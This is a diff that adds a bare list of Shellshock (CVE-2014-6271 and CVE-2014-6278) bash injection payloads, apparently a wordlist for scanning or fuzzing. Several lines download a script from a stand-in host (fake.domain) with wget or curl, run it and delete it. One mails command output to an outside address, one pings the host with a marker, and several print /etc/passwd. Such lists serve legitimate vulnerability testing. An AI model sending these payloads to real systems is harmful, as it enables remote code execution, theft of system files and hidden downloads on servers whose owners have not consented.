@@ -1,0 +1,24 @@
+() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }
+() { _;}>_[$($())] { echo x;}
+(%00) { :; }; echo 'CVE-2014-6271 vulnerable'
+() { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; } bash -c id
+() { 0; }; echo vulnerable; bash -c
+() { :;}; /bin/bash -c 'cd /tmp;wget http://fake.domain/ji;curl -O /tmp/ji http://fake.domain/ji ; perl /tmp/ji;rm -rf /tmp/ji'
+() { :;}; /bin/bash -c "/usr/bin/env curl -s http://fake.domain/cl.py > /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sleep 5; rm -rf /tmp/clamd_update"
+() { :;}; /bin/bash -c "whoami | mail -s 'example.com l' test.tester@fake.domain"
+() {:;}; /bin/cat /etc/passwd
+() { :; }; /bin/eject
+() { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20
+() { :;}; echo $(</etc/passwd)
+() { :; }; echo 'CVE-2014-6271 vulnerable'
+() { :;}; echo "NS:" $(</etc/passwd)
+() { foo() { foo; }; >bar; }
+() { function a a>\ bash -c echo
+() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd 
+() { ignored; };; echo "NS:" $(</etc/passwd)
+() {:;}; ping -c 1 -p cb18cb3f7bca4441a595fcc1e240deb0 fake.domain
+() { test;};echo "Content-type: text/plain"; echo; echo; /bin/cat /etc/passwd
+() { test;}; echo; echo; /bin/cat /etc/passwd
+() {:;}; /usr/bin/wget http://fake.domain/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== >> /dev/null
+().{.:;.};.wget /tmp/foo http://fake.domain chmod.777 /tmp/foo; /tmp/foo;
+() { x() { _; }; x() { _; } <<a; } bash -c
